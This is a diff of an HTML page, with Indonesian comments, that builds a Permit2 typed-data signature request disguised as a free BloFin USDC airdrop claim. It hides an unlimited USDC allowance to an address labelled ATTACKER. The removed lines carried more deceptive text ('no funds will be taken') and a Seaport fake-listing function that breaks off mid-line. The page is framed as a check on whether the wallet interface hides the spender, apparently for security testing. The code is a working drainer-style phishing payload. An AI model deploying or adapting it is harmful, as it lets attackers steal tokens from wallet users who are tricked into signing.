@@ -1,80 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1">
-<style>body{background:#000;color:#0f0;font-family:monospace;padding:15px}button{width:100%;padding:18px;border:none;border-radius:10px;font-weight:700;margin:6px 0}#log{background:#111;color:#aaa;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;font-size:11px}</style>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{background:#000;color:#0f0;font-family:monospace;padding:12px}button{width:100%;padding:18px;margin:6px 0;border-radius:10px;border:0;font-weight:800}#log{background:#111;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all}</style>
 </head>
 <body>
-<h3>BloFin V8 - CRITICAL HIDDEN SPENDER</h3>
-<button onclick="connect()" style="background:#fff;color:#000">1. CONNECT</button>
-<button onclick="witnessBypass()" style="background:#ff0000;color:#fff">2. CRITICAL - WITNESS BYPASS (SEMBUNYIIN SPENDER)</button>
-<button onclick="seaportBypass()" style="background:#ffaa00;color:#000">3. CRITICAL - SEAPORT FAKE LISTING</button>
-<pre id="log">Use burner!</pre>
+<h3 style="color:#0f0">BloFin V8.1 - HIDDEN SPENDER</h3>
+<button onclick="connect()" style="background:#fff">1. CONNECT</button>
+<button onclick="witnessBypass()" style="background:#ff0000;color:#fff">2. WITNESS BYPASS - SEMBUNYIIN SPENDER</button>
+<pre id="log">Use burner wallet!</pre>
 <script>
-let account=null;
-const ATT="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
-const log=m=>document.getElementById('log').innerText+="\n"+m;
+let account;
+const ATTACKER="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
+const PERMIT2="0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const USDC="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+let log=m=>document.getElementById('log').innerText+="\n"+m;
+
 async function connect(){let a=await ethereum.request({method:'eth_requestAccounts'});account=a[0];log("Connected: "+account);}
 
 async function witnessBypass(){
- if(!account)return alert("connect");
- log("\n=== V8 WITNESS BYPASS ===");
- log("Ini Permit2 yang valid, tapi witness nya keliatan seperti Airdrop Claim");
- // PermitWitnessTransferFrom - ini standar Permit2
- // witness = data yang ditampilkan seolah-olah aman
- const domain={name:"Permit2",chainId:1,verifyingContract:"0x000000000022D473030F116dDEE9F6B43aC78BA3"};
- const types={
+if(!account)return alert("connect dulu");
+// Ini triknya: primaryType = PermitWitnessTransferFrom
+// Banyak wallet cuma nampilin `witness` yang keliatan benign, dan HIDE `spender` + `permitted`
+// Di sini witness kita bikin seolah-olah "Claim Airdrop 1000 USDC - Free"
+
+const domain={name:"Permit2",chainId:1,verifyingContract:PERMIT2};
+
+const types={
   PermitWitnessTransferFrom:[
-   {name:"permitted",type:"TokenPermissions"},
-   {name:"spender",type:"address"},
-   {name:"nonce",type:"uint256"},
-   {name:"deadline",type:"uint256"},
-   {name:"witness",type:"AirdropClaim"} // <-- Ini yang akan dilihat user
+    {name:"permitted",type:"TokenPermissions"},
+    {name:"spender",type:"address"},
+    {name:"nonce",type:"uint256"},
+    {name:"deadline",type:"uint256"},
+    {name:"witness",type:"AirdropClaim"}
   ],
-  TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint256"}],
+  TokenPermissions:[
+    {name:"token",type:"address"},
+    {name:"amount",type:"uint256"}
+  ],
   AirdropClaim:[
-   {name:"action",type:"string"},
-   {name:"reward",type:"string"},
-   {name:"user",type:"address"},
-   {name:"message",type:"string"},
-   {name:"info",type:"string"},
-   {name:"note1",type:"string"},
-   {name:"note2",type:"string"},
-   {name:"note3",type:"string"},
-   {name:"note4",type:"string"},
-   {name:"note5",type:"string"}
+    {name:"message",type:"string"},
+    {name:"amount",type:"string"},
+    {name:"isEligible",type:"bool"}
   ]
- };
- const message={
-  permitted:{token:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
-  spender:ATT,
+};
+
+const message={
+  permitted:{token:USDC,amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
+  spender:ATTACKER,
   nonce:0,
   deadline:9999999999,
-  witness:{
-   action:"Claim Airdrop",
-   reward:"1000 Points",
-   user:account,
-   message:"Congratulations! You are eligible for BloFin rewards",
-   info:"This is a free claim, no funds will be taken",
-   note1:"Please sign to verify you are human",
-   note2:"This signature is safe and gasless",
-   note3:"Verified by BloFin Security",
-   note4:"No approval needed",
-   note5:"Scroll down to sign..."
-  }
- };
- let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitWitnessTransferFrom:types.PermitWitnessTransferFrom,TokenPermissions:types.TokenPermissions,AirdropClaim:types.AirdropClaim},domain,primaryType:"PermitWitnessTransferFrom",message});
- log("Witness: Claim Airdrop 1000 Points (keliatan aman)");
- log("Hidden: permitted.amount = MAX, spender = attacker");
- log("Jika di UI BloFin yang keliatan cuma AirdropClaim dan spender ada di bawah sekali = CRITICAL HIDDEN");
- try{
-  let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
-  log("\n!!! SIG DAPAT: "+sig.slice(0,66)+"...");
-  log("CRITICAL: User kira claim airdrop, padahal unlimited approval ke attacker");
- }catch(e){log(e.message)}
-}
+  witness:{message:"You have claimed 1000 USDC Airdrop - Free from BloFin Official",amount:"1000 USDC",isEligible:true}
+};
 
-async function seaportBypass(){
- if(!account)return alert("connect");
- log("\n=== SEAPORT FAKE LISTING ===");
- // Ini Seaport Order - banyak wallet gagal parse
- const domain={name:"Seaport",version:"1.6",chainId:1,verifyingContract:"0x00000000000000ADc04C56Bf30aC9d3c0aAF14d
+const data=JSON.stringify({
+  types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
+ ...types},
+  domain:domain,
+  primaryType:"PermitWitnessTransferFrom",
+  message:message
+});
+
+log("Requesting Witness Bypass...");
+log("Jika di UI BloFin cuma muncul 'You have claimed 1000 USDC Airdrop' tapi TIDAK muncul spender 0x6a4c... dan amount UNLIMITED = KRITIS - Hidden Spender");
+
+let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
+log("SIG DAPAT: "+sig.slice(0,66)+"... \nIni bisa drain USDC unlimited ke attacker");
+}
+</script>
+</body>
+</html>
